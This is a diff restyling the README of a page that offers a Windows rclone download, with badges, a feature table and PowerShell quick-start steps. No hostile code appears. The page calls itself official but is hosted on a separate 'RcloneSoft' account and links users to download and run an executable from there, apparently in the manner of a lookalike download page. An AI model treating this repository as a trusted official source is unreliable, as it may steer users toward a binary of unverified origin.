@@ -1,30 +1,55 @@
-# rclone — File Synchronization & Backup
+<div align="center">
 
-Official rclone Windows package reference for file synchronization, cloud storage transfers, and backup workflows.
+# rclone for Windows
 
-## Download
+### Sync files. Move data. Protect backups.
 
-[Download rclone v1.75.2 for Windows x64](https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip)
+<p>
+  <a href="https://github.com/RcloneSoft/rclone-download/releases"><img src="https://img.shields.io/github/v/release/RcloneSoft/rclone-download?style=flat-square&label=release&color=315c9b" alt="Latest release"></a>
+  <a href="https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip"><img src="https://img.shields.io/badge/platform-Windows%20x64-24a8d7?style=flat-square" alt="Windows x64"></a>
+  <a href="https://rclone.org/"><img src="https://img.shields.io/badge/package-portable-12233d?style=flat-square" alt="Portable package"></a>
+</p>
 
-The ZIP contains `rclone.exe` and the accompanying documentation. It is a portable Windows build: extract it and run `rclone.exe` from PowerShell or Command Prompt.
+<p><strong>Official Windows package reference for rclone</strong><br>
+File synchronization, cloud transfers, and repeatable backup workflows from one portable command-line tool.</p>
 
-## What rclone does
+<p>
+  <a href="https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip"><strong>Download for Windows x64 →</strong></a>
+  &nbsp;·&nbsp;
+  <a href="https://rclonesoft.github.io/">Website</a>
+  &nbsp;·&nbsp;
+  <a href="https://github.com/RcloneSoft/rclone-download/releases">Releases</a>
+</p>
 
-`rclone` is a command-line file management tool for Windows. It connects local folders, network shares, and cloud storage through one consistent interface, so you can move and manage data without relying on a separate desktop client for every service.
+</div>
 
-- Synchronizes files and directories between local storage and cloud providers
-- Creates backup copies with transfers, checks, and resumable operations
-- Supports many cloud and storage backends through one command-line tool
-- Provides filtering, encryption, checksums, retries, and scheduled automation
+---
 
-Typical uses include:
+## ✦ What rclone does
 
-- Keeping a local work folder synchronized with cloud storage
-- Moving data directly from one cloud provider to another
-- Creating repeatable backups with exclusions and filters
-- Running transfers from PowerShell, scripts, or Windows Task Scheduler
+`rclone` is a command-line file management tool for Windows. It connects local folders, network shares, and cloud storage through one consistent interface, so you can move and manage data without a separate desktop client for every service.
 
-## Quick start
+| Capability | Use it for |
+|---|---|
+| **↔ File synchronization** | Keep folders and remote storage aligned |
+| **☁ Cloud transfers** | Move data between local storage and cloud providers |
+| **▣ Backups** | Create repeatable copies with filters and resumable operations |
+| **⚙ Automation** | Run transfers from PowerShell, scripts, or Task Scheduler |
+
+### Common workflows
+
+- **Sync:** keep a local work folder aligned with cloud storage
+- **Migrate:** move data directly from one cloud provider to another
+- **Back up:** create scheduled copies with exclusions and filters
+- **Control:** use retries, progress output, checks, and optional encryption
+
+## ↓ Windows package
+
+[**Download rclone v1.75.2 for Windows x64**](https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip)
+
+The ZIP contains `rclone.exe` and the accompanying documentation. It is portable: extract it and run `rclone.exe` from PowerShell or Command Prompt.
+
+## ▶ Quick start
 
 ```powershell
 Expand-Archive .\rclone-v1.75.2-windows-amd64.zip -DestinationPath .
@@ -33,11 +58,17 @@ cd .\rclone-v1.75.2-windows-amd64
 .\rclone.exe config
 ```
 
-Create a copy after configuring a remote:
+After configuring an authorized remote, create a copy:
 
 ```powershell
 .\rclone.exe copy "C:\Users\Public\Documents" "remote:backups/documents" --progress
 ```
+
+## ◈ Resources
+
+- [Release notes and package assets](https://github.com/RcloneSoft/rclone-download/releases)
+- [rclone landing page](https://rclonesoft.github.io/)
+- [Official rclone documentation](https://rclone.org/docs/)
 
 ## License and attribution
 
